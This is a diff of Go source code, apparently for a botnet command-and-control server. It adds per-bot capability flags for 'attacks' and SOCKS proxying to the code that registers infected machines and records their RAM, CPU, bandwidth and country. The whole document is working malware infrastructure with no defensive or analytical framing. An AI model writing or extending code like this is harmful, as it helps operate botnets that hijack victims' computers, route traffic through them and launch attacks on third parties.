@@ -319,7 +319,7 @@ func lookupGeoIP(remoteAddr string) string {
 // Stores bot metadata: connection socket, unique ID, architecture, RAM, CPU, timestamps
 // Uses mutex locking for thread-safe map access (multiple bots connect concurrently)
 // Maintains both new map-based storage and legacy slice for backwards compatibility
-func addBotConnection(conn net.Conn, botID string, arch string, ram int64, cpuCores int, processName string, uplinkMbps float64, country string) {
+func addBotConnection(conn net.Conn, botID string, arch string, ram int64, cpuCores int, processName string, uplinkMbps float64, country string, attacksEnabled bool, socksEnabled bool) {
 	botConnsLock.Lock()
 	defer botConnsLock.Unlock()
 
@@ -333,19 +333,21 @@ func addBotConnection(conn net.Conn, botID string, arch string, ram int64, cpuCo
 	}
 
 	botConn := &BotConnection{
-		conn:          conn,
-		botID:         botID,
-		connectedAt:   time.Now(),
-		lastPing:      time.Now(),
-		authenticated: true,
-		arch:          arch,
-		ip:            conn.RemoteAddr().String(),
-		ram:           ram,
-		cpuCores:      cpuCores,
-		processName:   processName,
-		uplinkMbps:    uplinkMbps,
-		country:       country,
-		userConn:      nil,
+		conn:            conn,
+		botID:           botID,
+		connectedAt:     time.Now(),
+		lastPing:        time.Now(),
+		authenticated:   true,
+		arch:            arch,
+		ip:              conn.RemoteAddr().String(),
+		ram:             ram,
+		cpuCores:        cpuCores,
+		processName:     processName,
+		uplinkMbps:      uplinkMbps,
+		country:         country,
+		userConn:        nil,
+		attacksEnabled:  attacksEnabled,
+		socksEnabled:    socksEnabled,
 	}
 
 	botConnections[botID] = botConn
@@ -557,6 +559,15 @@ func handleBotConnection(conn net.Conn) {
 	if len(parts) > 7 {
 		fmt.Sscanf(parts[7], "%f", &uplinkMbps)
 	}
+	// Parse capability flags (parts[8]: "A"=attacks, "S"=socks, "AS"=both, ""=neither)
+	// Older bots without this field default to fully-enabled for backwards compatibility.
+	attacksEnabled := true
+	socksEnabled := true
+	if len(parts) > 8 {
+		caps := strings.TrimSpace(parts[8])
+		attacksEnabled = strings.Contains(caps, "A")
+		socksEnabled = strings.Contains(caps, "S")
+	}
 
 	// GeoIP lookup from bot's IP
 	country := lookupGeoIP(conn.RemoteAddr().String())
@@ -569,7 +580,7 @@ func handleBotConnection(conn net.Conn) {
 	}
 
 	// Add bot to connections
-	addBotConnection(conn, botID, arch, ram, cpuCores, processName, uplinkMbps, country)
+	addBotConnection(conn, botID, arch, ram, cpuCores, processName, uplinkMbps, country, attacksEnabled, socksEnabled)
 
 	// Reset deadline for normal operation
 	conn.SetDeadline(time.Time{})
